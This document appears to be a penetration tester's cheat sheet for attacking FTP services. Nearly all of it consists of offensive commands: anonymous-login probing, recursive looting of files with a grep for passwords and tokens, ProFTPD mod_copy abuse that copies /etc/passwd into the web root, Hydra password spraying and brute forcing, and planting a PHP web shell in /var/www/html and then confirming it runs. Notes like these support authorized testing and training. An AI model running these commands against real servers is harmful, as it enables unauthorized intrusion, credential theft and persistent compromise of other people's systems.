# 21 - FTP

## Service Usage

Basic login
```bash
ftp $ip
```
```bash
lftp -u $un,$pw $ip
```
Standard Commands
```bash
PWD
LIST -la         # LIST -a surfaces dotfiles; many clients omit -a by default
NLST             # bare names only — sometimes allowed where LIST is filtered
STAT .           # same listing, control channel only
CWD /incoming    # enumerate common dirs by hand: /pub /upload /incoming /files /backup /www /home
CDUP
get
```

## 0. Fast Path (try these first)

Credential reuse: if you have creds from another service (SMB, HTTP, etc.), try them on FTP before reaching for Hydra.

Test anonymous login across all common variants in one pass:
```bash
for u in anonymous ftp; do
  echo -e "USER $u\r\nPASS $u@\r\nQUIT\r" | timeout 5 nc $ip 21
done
```

Passive mode fix (use if listings hang / "425 Can't open data connection"):
```bash
lftp -u $un,$pw -e "set ftp:passive-mode on; ls; bye" $ip
```

## 1. Banner Grab & Unauthenticated Enumeration

netcat grab
```bash
nc -nv $ip 21
```
netcat grab with timeout
```bash
timeout 5 nc $ip 21
```

If SSL/TLS is enabled on this port (implicit/explicit ftps - implicit is normally on 990)
```bash
openssl s_client -connect $ip:21 -starttls ftp
```

curl - Works but noisy
```bash
curl -v ftp://$ip:21/ 2>&1 | head -n 5 
```

Anonymous login: anonymous:anonymous
```bash
curl -s --max-time 8 ftp://anonymous:anonymous@$ip/
```

Will report if root is writable
```bash
nmap -p 21 --script ftp-anon $ip
```

Enumerate FTP features
```bash
nmap -p 21 --script ftp-features $ip
```

enumerate common directories
```bash
gobuster dir -u ftp://$ip -w pslist.txt
```

All NSE scripts
```bash
nmap -p21 -sV --script "*ftp*" $ip
```

## 2. Authenticated Enumeration

Login over TLS (if plaintext refused or FTPS detected):
```bash
# Explicit FTPS (AUTH TLS)
lftp -u $un,$pw -e "set ftp:ssl-force true; set ftp:ssl-protect-data true; ls; bye" $ip
# Implicit FTPS (port 990 or given port)
lftp -u $un,$pw -e "set ftp:ssl-force true; set ftp:ssl-protect-data true; open ftps://$ip:990; ls; bye"
```

### Basic commands on signed in
```bash
MKD .testdir                -> 257 = create allowed
CWD .testdir
STOR probe.txt              -> 150/226 = upload allowed  (use a harmless name)
APPE probe.txt              -> append allowed
SITE CHMOD 777 probe.txt    -> 200 = permission control
SIZE probe.txt              -> confirms it landed
DELE probe.txt              -> cleanup
RMD .testdir
```

**ALWAYS list with `-a` — dotfiles (`.htaccess`, `.bash_history`, `.ssh/`, backups) are the highest-yield FTP find.**

Pull and grep
```bash
lftp -u anonymous,anonymous@ $IP -e "set ftp:ssl-allow no; mirror --parallel=2 / ./ftp_loot; bye"
grep -riE 'pass|pwd|user|key|token|secret' ftp_loot/
```

Single-file pull
```bash
curl -s ftp://$un:$pw@$ip/path/to/file -o file
```

wget fallback recursion (if mirror is blocked)
```bash
wget -r --ftp-user=$un --ftp-password=$pw ftp://$ip/
```

ProFTPD mod_copy — copy arbitrary server file to a readable location:
```bash
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
GET passwd.txt
```

## 3. Password Spraying / Bruteforcing

*Last resort — try anon + known creds first, brute force is usually a time sink.*

Spray to test passwords
```bash
hydra -L users.txt -p 'Spring2026!' -t 4 -W 3 -o spray_pass1.txt ftp://$ip
```
f to exit on hit
```bash
hydra -L users.txt -p pass.txt -f -t 4 -W 3 -o spray_pass1.txt ftp://$ip
```

Null/same-as-user/reversed logins (cheap first pass)
```bash
hydra -L users.txt -P pass.txt -e nsr -t 4 ftp://$ip
```

## 5. Quick Wins

TYPE I
```bash
TYPE I                     # <-- BEFORE upload. non-negotiable.
CWD /var/www/html
STOR s.php
SITE CHMOD 755 s.php
```

Verify the shell landed (don't assume CHMOD worked):
```bash
curl -s http://$ip/s.php
```

If `SITE CHMOD` returned 200 earlier, perms are controllable; otherwise many servers already write files executable. Always confirm mapping first:
```bash
PWD              # note landing dir — does it map to a web root?
```

### Default Credentials:
```
anonymous:anonymous@
anonymous:anonymous
anonymous:<anything>
      ftp:ftp
      ftp:<email>
```

## 6. Config Paths

vsftpd (Very Secure FTP)	
```text
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
```

ProFTPD	
```text
/etc/proftpd/proftpd.conf
/etc/proftpd.conf
/usr/local/etc/proftpd.conf
```

Pure-FTPd	
```text
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/conf/
```

IIS FTP
```text
%SystemDrive%\Windows\System32\inetsrv\config\applicationHost.config
```
FileZilla
```text
%ProgramData%\filezilla-server\settings.xml
%ProgramFiles%\FileZilla Server\FileZilla Server.xml
```

Config quick-reference:
```text
vsftpd        -> check anonymous_enable=YES, local_enable, write_enable
ProFTPD       -> mod_copy abuse (SITE CPFR/CPTO)
FileZilla     -> settings.xml often holds plaintext creds (MySQL/other)
```

## 7. Post-Exploit / Pivot

- FTP to web-shell chain → see HTTP notes
- File disclosure → see Linux PrivEsc / TTY notes
- Configs found with a shell → grep for creds, reuse across services